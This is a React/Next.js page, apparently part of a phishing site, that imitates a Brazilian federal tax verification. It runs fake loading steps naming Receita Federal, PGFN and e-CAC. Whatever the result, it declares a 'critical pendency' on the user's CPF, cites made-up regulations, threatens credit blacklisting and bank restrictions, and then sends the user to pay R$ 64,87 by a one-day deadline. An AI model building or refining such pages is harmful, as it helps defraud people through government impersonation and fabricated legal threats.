"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Loading } from "@/components/loading"
import { AlertBox } from "@/components/alert-box"
import type { VerificationData } from "@/lib/types"
import { formatCPF, generateProtocol } from "@/lib/utils"
import { AlertTriangle } from "lucide-react"
import { ProtocolBadge } from "@/components/protocol-badge"
import { LegalReferences } from "@/components/legal-references"
import { verifyTaxStatus } from "@/actions/verification"

export default function VerificacaoPage() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(true)
  const [showResult, setShowResult] = useState(false)
  const [verificationData, setVerificationData] = useState<VerificationData | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [protocol, setProtocol] = useState("")
  const [loadingStep, setLoadingStep] = useState(0)
  const currentDate = new Date().toLocaleDateString("pt-BR")
  const tomorrowDate = new Date()
  tomorrowDate.setDate(tomorrowDate.getDate() + 1)
  const deadlineDate = tomorrowDate.toLocaleDateString("pt-BR")
  const currentTime = new Date().toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" })

  useEffect(() => {
    const cpf = sessionStorage.getItem("userCpf")

    if (!cpf) {
      router.push("/")
      return
    }

    // Gerar protocolo
    const newProtocol = generateProtocol(cpf)
    setProtocol(newProtocol)

    const fetchData = async () => {
      try {
        console.log("Iniciando verificação para CPF:", cpf)

        // Simular etapas de carregamento
        setLoadingStep(1)
        await new Promise((resolve) => setTimeout(resolve, 1500))

        setLoadingStep(2)
        await new Promise((resolve) => setTimeout(resolve, 1200))

        // Buscar dados usando a função de verificação
        const data = await verifyTaxStatus(cpf)
        setVerificationData(data)

        // Armazenar o nome obtido para uso em outras páginas
        sessionStorage.setItem("userName", data.personData.name)

        setLoadingStep(3)
        await new Promise((resolve) => setTimeout(resolve, 1000))

        // Armazenar dados na sessionStorage para uso em outras páginas
        sessionStorage.setItem("verificationData", JSON.stringify(data))
        sessionStorage.setItem("protocol", newProtocol)

        // Simular tempo de processamento
        setLoadingStep(4)
        await new Promise((resolve) => setTimeout(resolve, 800))

        setIsLoading(false)
        setTimeout(() => {
          setShowResult(true)
        }, 500)
      } catch (error) {
        console.error("Error during verification:", error)
        setError("Ocorreu um erro durante a verificação. Usando dados simulados.")

        // Buscar apenas o CPF da sessionStorage
        const cpf = sessionStorage.getItem("userCpf") || ""

        // Criar dados simulados para continuar o fluxo
        const simulatedPersonData = {
          name: "Cliente Simulado",
          birthDate: "01/01/1980",
          address: "Endereço Simulado, 123",
          email: `${cpf.substring(0, 4)}@exemplo.com.br`,
          phone: `(${cpf.substring(0, 2)}) 9${cpf.substring(2, 6)}-${cpf.substring(6, 10)}`,
        }

        // Armazenar o nome simulado
        sessionStorage.setItem("userName", simulatedPersonData.name)

        const simulatedData: VerificationData = {
          cpf: cpf,
          personData: simulatedPersonData,
          companyData: {
            cnpj: "00.000.000/0001-00",
            razaoSocial: `${simulatedPersonData.name} Tecnologia S/A`,
            naturezaJuridica: "Sociedade Empresária Limitada",
            dataAbertura: "2024-01-01",
            situacaoCadastral: "Ativa",
            capitalSocial: "10.000,00",
            endereco: "Av. Paulista, 1000, Bela Vista, São Paulo/SP, CEP 01310-100",
            atividadePrincipal: "Comércio varejista",
          },
        }

        setVerificationData(simulatedData)
        sessionStorage.setItem("verificationData", JSON.stringify(simulatedData))
        sessionStorage.setItem("protocol", newProtocol)

        // Continuar o fluxo mesmo com erro
        setIsLoading(false)
        setTimeout(() => {
          setShowResult(true)
        }, 500)
      }
    }

    fetchData()
  }, [router])

  const handleContinue = () => {
    // Ir direto para a página de pagamento, pulando a página de alerta
    router.push("/pagamento")
  }

  const loadingMessages = [
    "Consultando pendências junto à Receita Federal...",
    "Verificando situação cadastral na PGFN...",
    "Analisando obrigações fiscais na SEFISC...",
    "Verificando registros no sistema integrado Redesim...",
    "Processando dados junto ao e-CAC...",
    "Consultando Base Nacional de Conformidade...",
    "Verificando situação junto ao CNPJ...",
    "Analisando histórico fiscal...",
    "Validando dados junto ao Sistema Integrado de Fiscalização...",
    "Finalizando análise de conformidade...",
  ]

  const getLoadingMessage = () => {
    switch (loadingStep) {
      case 1:
        return ["Consultando pendências junto à Receita Federal...", "Verificando situação cadastral na PGFN..."]
      case 2:
        return [
          "Consultando pendências junto à Receita Federal...",
          "Verificando situação cadastral na PGFN...",
          "Analisando obrigações fiscais na SEFISC...",
          "Verificando registros no sistema integrado Redesim...",
        ]
      case 3:
        return [
          "Consultando pendências junto à Receita Federal...",
          "Verificando situação cadastral na PGFN...",
          "Analisando obrigações fiscais na SEFISC...",
          "Verificando registros no sistema integrado Redesim...",
          "Processando dados junto ao e-CAC...",
          "Consultando Base Nacional de Conformidade...",
          "Verificando situação junto ao CNPJ...",
        ]
      case 4:
        return loadingMessages
      default:
        return loadingMessages
    }
  }

  return (
    <div className="max-w-3xl mx-auto">
      <div className="gov-card">
        {isLoading ? (
          <Loading messages={getLoadingMessage()} />
        ) : (
          <>
            {error && (
              <AlertBox type="info" title="Aviso">
                <p>{error}</p>
                <p className="mt-2">Continuando com dados simulados para fins de demonstração.</p>
              </AlertBox>
            )}

            {showResult && verificationData ? (
              <div className="space-y-6 animate-fadeIn">
                <div className="text-center">
                  <h1 className="text-xl font-bold text-gray-900 mb-4">Resultado da Verificação</h1>
                  <ProtocolBadge protocol={protocol} date={currentDate} time={currentTime} />
                </div>

                <div className="danger-block">
                  <div className="flex">
                    <div className="flex-shrink-0">
                      <AlertTriangle className="h-5 w-5 danger-icon" />
                    </div>
                    <div className="ml-3">
                      <h3 className="text-sm text-red-700 font-medium">PENDÊNCIA CRÍTICA IDENTIFICADA</h3>
                      <div className="mt-2 text-sm text-gray-700">
                        <p className="font-medium">
                          Ao CNPJ vinculado ao CPF {formatCPF(verificationData.cpf)} ({verificationData.personData.name}
                          ) consta como "Não Regularizado" na Base Nacional de Conformidade.
                        </p>
                        <p className="mt-2">
                          <strong>Tipo de Pendência:</strong> Validação Inicial de Cadastro Empresarial (VICE)
                        </p>
                        <p>
                          <strong>Valor para regularização:</strong> R$ 64,87
                        </p>
                        <p>
                          <strong>Prazo limite para regularização:</strong> {deadlineDate}
                        </p>
                        <p className="text-xs text-red-500 mt-2 font-medium">
                          A não regularização resultará em bloqueio imediato de emissão de notas fiscais, restrição
                          bancária e inclusão do CPF em órgãos de proteção ao crédito.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="bg-yellow-50 p-4 rounded border border-yellow-200">
                  <h3 className="text-md font-semibold text-yellow-800 mb-2 flex items-center">
                    <AlertTriangle size={16} className="mr-2 text-yellow-600" />
                    Consequências da Não Regularização
                  </h3>
                  <div className="space-y-2">
                    <div className="flex items-start">
                      <AlertTriangle className="text-yellow-500 mr-2 mt-0.5" size={16} />
                      <span className="text-sm">Bloqueio imediato de emissão de notas fiscais</span>
                    </div>
                    <div className="flex items-start">
                      <AlertTriangle className="text-yellow-500 mr-2 mt-0.5" size={16} />
                      <span className="text-sm">Restrição bancária e impedimento de acesso a créditos</span>
                    </div>
                    <div className="flex items-start">
                      <AlertTriangle className="text-yellow-500 mr-2 mt-0.5" size={16} />
                      <span className="text-sm">Inclusão do CPF em órgãos de proteção ao crédito</span>
                    </div>
                    <div className="flex items-start">
                      <AlertTriangle className="text-yellow-500 mr-2 mt-0.5" size={16} />
                      <span className="text-sm">Suspensão de benefícios MEI e INSS</span>
                    </div>
                  </div>
                </div>

                <LegalReferences
                  references={[
                    "Portaria SEFISC nº 24/2023, Art. 12, Parágrafo 3º",
                    "Resolução PGFN/ME nº 101/2024",
                    "Art. 7º do Regulamento de Abertura Fiscal Integrada (RAFI)",
                  ]}
                  linkUrl="/legislacao"
                />

                <div className="flex justify-center mt-6">
                  <button
                    onClick={handleContinue}
                    className="gov-button transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98]"
                  >
                    Regularizar Pendência Agora
                  </button>
                </div>
              </div>
            ) : null}
          </>
        )}
      </div>
    </div>
  )
}
